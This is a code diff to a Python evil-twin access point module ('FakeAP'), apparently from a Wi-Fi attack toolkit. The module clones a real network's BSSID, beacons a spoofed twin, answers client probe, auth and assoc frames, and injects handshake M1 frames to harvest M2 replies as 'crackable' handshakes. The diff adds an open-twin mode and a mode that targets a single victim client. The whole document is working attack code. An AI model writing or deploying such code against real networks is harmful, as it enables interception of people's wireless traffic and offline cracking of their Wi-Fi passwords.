@@ -1,7 +1,8 @@
-"""FakeAP: the WPA2 twin's beacon + responder + per-client state (mechanism only, no UI/log).
+"""FakeAP: the twin's beacon + responder + per-client state (mechanism only, no UI/log).
 
-Owns the decoy-channel interface: arms active-monitor on the cloned BSSID, beacons the WPA2 twin,
-answers probe/auth/assoc, and crafts + injects M1 with a fresh per-client ANonce. It emits nothing
+Owns the decoy-channel interface: arms active-monitor on the cloned BSSID, beacons the twin,
+answers probe/auth/assoc, and (``secured`` twins only) crafts + injects M1 with a fresh per-client
+ANonce. An open twin (``secured=False``) stops at assoc: there's no 4-way to start. It emits nothing
 to the UI. The campaign polls ``stats`` for the activity log and reads the sink for the
 crackable-handshake stop condition. Each M1 is passed to ``record_m1`` (the campaign seeds the sink)
 *before* it is injected, so an immediate M2 already has its donor.
@@ -50,7 +51,8 @@ class FakeApStats:
 
 class FakeAP:
     def __init__(self, twin_iface, bssid: bytes, ssid: str, channel: int, twin_beacon: bytes,
-                 rx_source=None, record_m1: Optional[Callable[[bytes], None]] = None):
+                 rx_source=None, record_m1: Optional[Callable[[bytes], None]] = None,
+                 secured: bool = True, target_client: Optional[bytes] = None):
         self.iface = twin_iface
         self.bssid = bssid
         self.ssid = ssid
@@ -58,8 +60,10 @@ class FakeAP:
         self.twin_beacon = twin_beacon
         self.rx_source = rx_source
         self.record_m1 = record_m1 or (lambda _frame: None)
+        self.secured = secured                      # False: open twin, no EAPOL/4-way at all
+        self.target_client = target_client           # non-None: ignore every other client entirely
         self.stats = FakeApStats()
-        self._probe_resp = probe_resp(bssid, ssid, channel)
+        self._probe_resp = probe_resp(bssid, ssid, channel, secured=secured)
         self._running = False
         self._beacon_task: Optional[asyncio.Task] = None
 
@@ -101,6 +105,8 @@ class FakeAP:
         if len(raw) < 24:
             return
         client = raw[10:16]
+        if self.target_client is not None and client != self.target_client:
+            return                                   # single-client mode: ignore every bystander
         if pkt.type == "eapol":
             self._on_m2(pkt, client)
             return
@@ -135,7 +141,9 @@ class FakeAP:
         self.stats.assoc += 1
         cs = mac_to_str(client)
         self._advance(cs, ClientPhase.ASSOCED)
-        self._tx(assoc_resp(self.bssid, client))
+        self._tx(assoc_resp(self.bssid, client, secured=self.secured))
+        if not self.secured:                        # open twin: assoc is the whole story, no 4-way
+            return
         anonce = os.urandom(32)
         rec = self.stats.clients[cs]
         rec.anonce, rec.replay = anonce, 1
@@ -144,7 +152,7 @@ class FakeAP:
         self._tx(m1)
 
     def _on_m2(self, pkt, client: bytes) -> None:
-        if getattr(pkt, "msg_num", 0) != 2:
+        if not self.secured or getattr(pkt, "msg_num", 0) != 2:
             return
         cs = mac_to_str(client)
         rec = self.stats.clients.get(cs)
